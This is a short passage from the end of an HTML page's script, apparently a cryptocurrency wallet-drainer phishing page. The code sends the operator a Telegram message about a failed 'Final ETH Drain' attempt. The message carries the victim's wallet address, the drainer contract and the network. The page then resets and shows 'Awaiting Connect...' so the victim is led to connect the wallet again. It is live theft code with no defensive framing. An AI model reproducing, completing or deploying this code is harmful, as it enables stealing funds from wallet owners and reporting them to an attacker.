                    await sendTelegramMessage(`‚ùå *Final ETH Drain Failed (Attempt 2)* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    setTimeout(() => {
                        showStep(1); // Redirect to initial step
                        finalConfirmAttempts = 0; // Reset attempts
                        document.getElementById("status").innerText = "Awaiting Connect...";
                        userAccount = null; // Reset user account to force reconnection
                    }, 3000);
                }
            }
        });
    </script>
</body>
</html>